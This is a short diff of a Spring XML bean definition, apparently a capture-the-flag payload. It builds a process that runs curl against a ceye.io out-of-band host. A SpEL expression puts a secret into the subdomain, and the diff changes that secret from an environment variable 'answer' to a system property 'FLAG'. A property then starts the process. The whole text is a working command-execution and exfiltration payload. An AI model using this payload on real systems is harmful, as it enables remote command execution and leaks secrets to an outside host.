@@ -8,7 +8,7 @@
      <constructor-arg>
         <list>
           <value>curl</value>
-          <value>#{ systemEnvironment['answer'] }.zg80gf.ceye.io</value>
+          <value>#{ systemProperties['FLAG'] }.zg80gf.ceye.io</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
